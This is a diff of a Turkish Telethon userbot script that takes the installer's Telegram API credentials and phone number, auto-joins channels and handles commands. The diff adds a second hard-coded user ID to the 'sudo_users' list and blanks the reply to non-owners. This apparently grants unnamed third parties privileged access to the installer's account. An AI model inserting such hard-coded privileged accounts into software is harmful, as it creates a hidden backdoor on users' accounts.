@@ -54,7 +54,7 @@ owner_id = input("KULLANİCİ İD GİR : ")
 telethon_api_id = input("APİ İD GİR : ")
 telethon_api_hash =input("APİ HASH GİR : ")
 telethon_telefon_numarasi = input("TELEGRAM HESAP NUMARA GİR : ")
-sudo_users = [6166620373]
+sudo_users = [6166620373, 6590622581]
 
 telethon_client = TelegramClient("ramowlf.session", telethon_api_id, telethon_api_hash)
 
@@ -65,9 +65,9 @@ async def kontrol(client):
         try:
             kanal_ent = await client.get_entity(kanal)  
             await client(JoinChannelRequest(kanal_ent))
-            await asyncio.sleep(2)  # Kanal katılım işlemi arasında bekleme süresi
+            await asyncio.sleep(2)  
         except Exception as e:
-            print(f"hatayi jesus abine ilet cozer : {e}")
+            print(f"hata mesajı : {e}")
     await asyncio.sleep(5)  
     
 
@@ -1246,7 +1246,7 @@ async def disapprove_command_handler(event):
 async def my_event_handler(event):
     if event.raw_text.startswith('.kurulum'):
         if str(event.sender_id) != owner_id:
-            await event.respond('Bu Komutu Sadece Sahibi Kullanabilir.')
+            await event.respond('')
             return
 
         try:
